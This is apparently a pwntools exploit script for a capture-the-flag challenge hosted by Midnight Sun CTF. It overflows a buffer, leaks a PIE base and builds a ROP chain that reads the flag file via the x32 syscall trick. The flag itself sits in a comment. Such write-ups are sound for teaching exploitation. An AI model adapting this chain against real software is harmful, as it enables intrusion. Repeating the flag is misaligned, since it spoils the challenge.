#!/usr/bin/env python
from pwn import *

# midnight{I_kN3w_1_5H0ulD_h4v3_jUst_uS3d_l1B5eCC0mP}

context.arch = 'amd64'
host , port = 'gissa-igen-01.play.midnightsunctf.se' , 4096
y = remote( host , port )


y.sendlineafter( ':' , '' )

y.sendlineafter( ':' , 'a' * 140 + p16( 0xa0 ) + p16( 0 ) + p64( 0 ) + p64( 0 )[:-1] ) # l c r i

y.sendafter( ':' , 'a' * 140 + p16( 0x6666 ) + p16( 0x0101 ) + p64(0xffffffffffffffff) + p64( 0xffffffffffffffff ) )


y.recvuntil( '\xff' * 0x10 )
pie = u64( y.recv(6) + '\0\0' ) - 0xbb7
success( 'pie -> %s' % hex( pie ) )

bss = pie + 0x202000 + 0x10
pppr = pie + 0xc21 # pop rax ; pop rdi ; pop rsi ; ret
pppppr = pie + 0xc1d
read = pie + 0xBD4
write = pie + 0xBDC
syscall = pie + 0xbd9

flag = pie + 0x1585

p = flat(
    'a' * 0xa0,
    0,
    pppppr,
    0, 0, 0, 0, 0,
    pppr,
    0x40000000 | 2, flag , 0,
    syscall,
    pppppr,
    0x70, 0, 0, 3, bss,
    read,
    pppppr,
    0x70, 0, 0, 1, bss,
    write,

)
y.sendlineafter( ':' , p )

y.interactive()